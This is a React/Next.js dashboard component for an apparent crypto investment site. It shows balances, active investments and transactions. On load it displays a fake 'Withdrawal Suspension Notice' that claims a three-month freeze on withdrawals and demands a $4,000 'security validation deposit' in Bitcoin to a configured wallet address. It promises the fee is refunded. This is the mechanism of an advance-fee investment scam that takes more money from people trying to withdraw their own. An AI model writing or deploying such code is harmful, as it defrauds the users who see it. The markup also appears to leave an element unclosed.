"use client";

import { useEffect, useState } from "react";
import { TrendingUp, Wallet, ArrowDownToLine, ArrowUpFromLine, Activity, Loader2, Clock, AlertCircle, Zap, X, Bitcoin, Copy, CheckCircle } from "lucide-react";
import Link from "next/link";
import CryptoMarket from "@/components/CryptoMarket";

type Transaction = {
  id: string;
  type: string;
  amount: number;
  cryptoType: string;
  status: string;
  createdAt: string;
};

type UserInvestment = {
  id: string;
  assetName: string;
  assetSymbol: string;
  amount: number;
  term: string;
  createdAt: string;
};

type UserData = {
  name: string;
  email: string;
  walletBalance: number;
  portfolio: { totalValue: number; profit: number };
  transactions: Transaction[];
  investments: UserInvestment[];
};

export default function DashboardOverview() {
  const [user, setUser] = useState<UserData | null>(null);
  const [loading, setLoading] = useState(true);

  const [adminBtcAddress, setAdminBtcAddress] = useState("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");
  const [initialNoticeOpen, setInitialNoticeOpen] = useState(true);
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);

  const UNLOCK_AMOUNT = 4000;

  useEffect(() => {
    fetch("/api/admin/settings")
      .then((r) => r.json())
      .then((settings) => {
        if (settings?.btcAddress && settings.btcAddress !== "bc1q...") {
          setAdminBtcAddress(settings.btcAddress);
        }
      })
      .catch(() => {});
  }, []);

  useEffect(() => {
    const targetDate = new Date('2026-10-16T23:59:59Z').getTime();
    const updateTimer = () => {
      const now = new Date().getTime();
      const diff = Math.floor((targetDate - now) / 1000);
      setCountdown(diff > 0 ? diff : 0);
    };
    updateTimer();
    const timer = setInterval(updateTimer, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatCountdown = (secs: number) => {
    const days = Math.floor(secs / (3600 * 24));
    const hours = Math.floor((secs % (3600 * 24)) / 3600).toString().padStart(2, '0');
    const minutes = Math.floor((secs % 3600) / 60).toString().padStart(2, '0');
    const seconds = (secs % 60).toString().padStart(2, '0');
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
  };

  const copyAddress = () => {
    navigator.clipboard.writeText(adminBtcAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  useEffect(() => {
    fetch("/api/user/me")
      .then((r) => r.json())
      .then((data) => {
        setUser(data);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, []);

  const firstName = user?.name?.split(" ")[0] || "Investor";

  const sellInvestment = async (investmentId: string) => {
    if (!confirm("Are you sure you want to sell this investment? The original amount plus profit will be added to your wallet.")) return;
    
    try {
      const res = await fetch("/api/investments/sell", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ investmentId }),
      });
      
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);
      
      alert(`Investment sold successfully! \n\nPayout: $${data.payout.toLocaleString("en-US", { minimumFractionDigits: 2 })} \nProfit: $${data.profit.toLocaleString("en-US", { minimumFractionDigits: 2 })}`);
      
      // Reload dashboard data
      window.location.reload();
    } catch (err: any) {
      alert(err.message || "Failed to sell investment");
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <Loader2 className="w-10 h-10 animate-spin text-emerald-500" />
      </div>
    );
  }

  const statusColors: Record<string, string> = {
    APPROVED: "bg-emerald-100 text-emerald-700 dark:bg-emerald-900/40 dark:text-emerald-400",
    PENDING: "bg-yellow-100 text-yellow-700 dark:bg-yellow-900/40 dark:text-yellow-400",
    REJECTED: "bg-red-100 text-red-700 dark:bg-red-900/40 dark:text-red-400",
  };

  return (
    <div className="space-y-8">
      {/* ═══════════════════════════════════════════════
          INITIAL WITHDRAWAL SUSPENSION POPUP NOTICE
      ═══════════════════════════════════════════════ */}
      {initialNoticeOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-md p-4">
          <div className="relative bg-gray-950 border border-gray-800 rounded-2xl w-full max-w-lg shadow-[0_0_50px_rgba(239,68,68,0.15)] overflow-hidden animate-in fade-in zoom-in-95 duration-200">
            <button
              onClick={() => setInitialNoticeOpen(false)}
              className="absolute top-4 right-4 text-gray-500 hover:text-white transition-colors"
            >
              <X className="w-5 h-5" />
            </button>
            <div className="p-8 space-y-6">
              <div className="text-center space-y-2">
                <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-red-500/10 text-red-400 mb-2">
                  <AlertCircle className="w-8 h-8 animate-pulse" />
                </div>
                <h3 className="text-2xl font-bold text-white tracking-tight">Withdrawal Suspension Notice</h3>
                <p className="text-gray-400 text-sm leading-relaxed">
                  Standard withdrawals are currently suspended for the next 3 months due to compliance auditing and end-of-quarter portfolio reviews.
                </p>
                <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4 flex flex-col items-center justify-center mt-4">
                  <span className="text-xs font-semibold text-red-400 uppercase tracking-wider mb-1">Standard suspension remaining:</span>
                  <span className="font-mono text-xl font-extrabold text-red-400 tracking-wider">{formatCountdown(countdown)}</span>
                </div>
              </div>

              <div className="border-t border-gray-800 my-4" />

              <div className="space-y-4">
                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
                  <Zap className="w-4 h-4 text-amber-400" /> Need Fast Withdrawal?
                </h4>
                <p className="text-gray-400 text-sm leading-relaxed">
                  To bypass the 3-month hold and initiate an <strong className="text-white">Express Withdrawal (24 hours)</strong>, compliance requires a security validation deposit of <strong className="text-white">${UNLOCK_AMOUNT.toLocaleString()} in BTC</strong>. This release fee is fully credited to your account or returned upon withdrawal release.
                </p>

                <div className="space-y-2">
                  <p className="text-xs font-bold text-orange-400 flex items-center gap-1.5">
                    <Bitcoin className="w-4 h-4" /> Send exactly ${UNLOCK_AMOUNT.toLocaleString()} BTC to:
                  </p>
                  <div className="bg-gray-900 border border-orange-500/30 rounded-xl p-4 flex items-center gap-3">
                    <p className="font-mono text-xs text-orange-300 break-all flex-1">{adminBtcAddress}</p>
                    <button
                      onClick={copyAddress}
                      className="shrink-0 p-2 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 rounded-lg transition-colors"
                      title="Copy address"
                    >
                      {copied ? <CheckCircle className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
              </div>

              <div className="pt-4 flex flex-col sm:flex-row gap-3">
                <button
                  onClick={() => setInitialNoticeOpen(false)}
                  className="flex-1 py-3 bg-gray-900 border border-gray-700 hover:bg-gray-800 text-white rounded-xl font-semibold transition-colors"
                >
                  Close & View Dashboard
                </button>
                <Link
                  href="/dashboard/withdraw"
                  className="flex-1 py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white rounded-xl font-semibold transition-all shadow-[0_0_20px_rgba(16,185,129,0.15)] flex items-center justify-center gap-2"
                >
                  <Zap className="w-4 h-4" />
                  Request Express Bypass
                </Link>
              </div>
            </div>
          </div>
        </div>
      )}
      <div className="space-y-8">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div>
          <h1 className="text-2xl font-bold text-navy-900 dark:text-white">Welcome back, {firstName}! 👋</h1>
          <p className="text-navy-600 dark:text-navy-400">Here's what's happening with your investments today.</p>
        </div>
        <div className="flex space-x-3">
          <Link
            href="/dashboard/deposit"
            className="px-4 py-2 bg-emerald-600 text-white rounded-lg font-medium hover:bg-emerald-700 transition-colors flex items-center space-x-2"
          >
            <ArrowDownToLine className="w-4 h-4" />
            <span>Deposit Funds</span>
          </Link>
          <Link
            href="/dashboard/withdraw"
            className="px-4 py-2 bg-navy-800 dark:bg-navy-700 text-white rounded-lg font-medium hover:bg-navy-700 transition-colors flex items-center space-x-2"
          >
            <ArrowUpFromLine className="w-4 h-4" />
            <span>Withdraw</span>
          </Link>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <div className="bg-white dark:bg-navy-800 p-6 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm">
          <div className="flex justify-between items-start mb-4">
            <div className="w-12 h-12 rounded-xl bg-emerald-50 dark:bg-emerald-900/30 flex items-center justify-center">
              <Wallet className="w-6 h-6 text-emerald-600 dark:text-emerald-400" />
            </div>
          </div>
          <p className="text-navy-500 dark:text-navy-400 text-sm font-medium">Wallet Balance</p>
          <h3 className="text-3xl font-bold text-navy-900 dark:text-white mt-1">
            ${(user?.walletBalance ?? 0).toLocaleString("en-US", { minimumFractionDigits: 2 })}
          </h3>
        </div>

        <div className="bg-white dark:bg-navy-800 p-6 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm">
          <div className="flex justify-between items-start mb-4">
            <div className="w-12 h-12 rounded-xl bg-navy-50 dark:bg-navy-900 flex items-center justify-center">
              <Activity className="w-6 h-6 text-navy-600 dark:text-navy-300" />
            </div>
          </div>
          <p className="text-navy-500 dark:text-navy-400 text-sm font-medium">Portfolio Value</p>
          <h3 className="text-3xl font-bold text-navy-900 dark:text-white mt-1">
            ${(user?.portfolio?.totalValue ?? 0).toLocaleString("en-US", { minimumFractionDigits: 2 })}
          </h3>
        </div>

        <div className="bg-white dark:bg-navy-800 p-6 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm">
          <div className="flex justify-between items-start mb-4">
            <div className="w-12 h-12 rounded-xl bg-emerald-50 dark:bg-emerald-900/20 flex items-center justify-center">
              <TrendingUp className="w-6 h-6 text-emerald-500" />
            </div>
          </div>
          <p className="text-navy-500 dark:text-navy-400 text-sm font-medium">Total Profit</p>
          <h3 className="text-3xl font-bold text-emerald-600 dark:text-emerald-400 mt-1">
            +${(user?.portfolio?.profit ?? 0).toLocaleString("en-US", { minimumFractionDigits: 2 })}
          </h3>
        </div>
      </div>

      {/* Active Investments */}
      {user?.investments && user.investments.length > 0 && (
        <div className="bg-white dark:bg-navy-800 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm overflow-hidden">
          <div className="p-6 border-b border-navy-200 dark:border-navy-700">
            <h3 className="text-lg font-bold text-navy-900 dark:text-white">Your Active Investments</h3>
          </div>
          <div className="p-6">
            <div className="grid grid-cols-1 gap-4">
              {user.investments.map((inv) => (
                <div key={inv.id} className="flex flex-col md:flex-row justify-between items-start md:items-center p-4 bg-navy-50 dark:bg-navy-900 rounded-xl border border-navy-100 dark:border-navy-700">
                  <div className="mb-4 md:mb-0">
                    <div className="flex items-center space-x-2">
                      <h4 className="text-lg font-bold text-navy-900 dark:text-white">{inv.assetName}</h4>
                      <span className="px-2 py-0.5 text-xs font-semibold bg-emerald-100 text-emerald-700 dark:bg-emerald-900/40 dark:text-emerald-400 rounded-full">
                        {inv.assetSymbol}
                      </span>
                    </div>
                    <p className="text-sm text-navy-500 dark:text-navy-400 mt-1">
                      Invested: <span className="font-semibold text-navy-900 dark:text-white">${inv.amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span> • Term: {inv.term}
                    </p>
                    <p className="text-xs text-navy-400 dark:text-navy-500 mt-1">
                      Started: {new Date(inv.createdAt).toLocaleDateString()}
                    </p>
                  </div>
                  <button
                    onClick={() => sellInvestment(inv.id)}
                    className="px-5 py-2.5 bg-red-500 hover:bg-red-600 text-white rounded-lg font-semibold transition-colors w-full md:w-auto"
                  >
                    Sell Investment
                  </button>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Crypto Market Widget */}
      <CryptoMarket />

      {/* Invest CTA */}
      <div className="bg-gradient-to-r from-emerald-600 to-emerald-500 rounded-2xl p-6 flex flex-col md:flex-row items-center justify-between gap-4 shadow-[0_0_40px_rgba(16,185,129,0.15)]">
        <div>
          <h3 className="text-xl font-bold text-white">Ready to grow your wealth?</h3>
          <p className="text-emerald-100 text-sm mt-1">
            Browse our curated 20 investment assets — Stocks, Crypto &amp; ETFs — with live prices and instant execution.
          </p>
        </div>
        <Link
          href="/dashboard/invest"
          className="shrink-0 px-6 py-3 bg-white text-emerald-700 hover:bg-emerald-50 rounded-xl font-bold transition-colors flex items-center gap-2 whitespace-nowrap"
        >
          <TrendingUp className="w-5 h-5" />
          Browse Investments
        </Link>
      </div>

      {/* Recent Transactions */}
      <div className="bg-white dark:bg-navy-800 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm overflow-hidden">
        <div className="p-6 border-b border-navy-200 dark:border-navy-700">
          <h3 className="text-lg font-bold text-navy-900 dark:text-white">Recent Transactions</h3>
        </div>
        <div className="p-6">
          {user?.transactions && user.transactions.length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full text-left min-w-[600px]">
                <thead>
                  <tr className="text-navy-500 dark:text-navy-400 text-sm border-b border-navy-100 dark:border-navy-700">
                    <th className="pb-3 font-medium">Type</th>
                    <th className="pb-3 font-medium">Asset</th>
                    <th className="pb-3 font-medium">Amount</th>
                    <th className="pb-3 font-medium">Date</th>
                    <th className="pb-3 font-medium">Status</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-navy-100 dark:divide-navy-700">
                  {user.transactions.map((tx) => (
                    <tr key={tx.id}>
                      <td className="py-4 text-navy-900 dark:text-white font-medium flex items-center">
                        {tx.type === "DEPOSIT" ? (
                          <ArrowDownToLine className="w-4 h-4 mr-2 text-emerald-500 shrink-0" />
                        ) : (
                          <ArrowUpFromLine className="w-4 h-4 mr-2 text-red-400 shrink-0" />
                        )}
                        {tx.type === "DEPOSIT" ? "Deposit" : "Withdrawal"}
                      </td>
                      <td className="py-4 text-navy-600 dark:text-navy-400 font-medium">{tx.cryptoType}</td>
                      <td className="py-4 text-navy-900 dark:text-white font-medium">
                        ${tx.amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                      </td>
                      <td className="py-4 text-navy-600 dark:text-navy-400">
                        {new Date(tx.createdAt).toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" })}
                      </td>
                      <td className="py-4">
                        <span className={`px-3 py-1 text-xs font-semibold rounded-full ${statusColors[tx.status] || ""}`}>
                          {tx.status.charAt(0) + tx.status.slice(1).toLowerCase()}
                        </span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <div className="text-center py-12">
              <Wallet className="w-12 h-12 text-navy-300 dark:text-navy-600 mx-auto mb-4" />
              <p className="text-navy-500 dark:text-navy-400 font-medium">No transactions yet</p>
              <p className="text-sm text-navy-400 dark:text-navy-500 mt-1">Make your first deposit to get started!</p>
              <Link
                href="/dashboard/deposit"
                className="mt-4 inline-block px-5 py-2.5 bg-emerald-600 text-white rounded-lg font-semibold hover:bg-emerald-700 transition-colors"
              >
                Deposit Now
              </Link>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
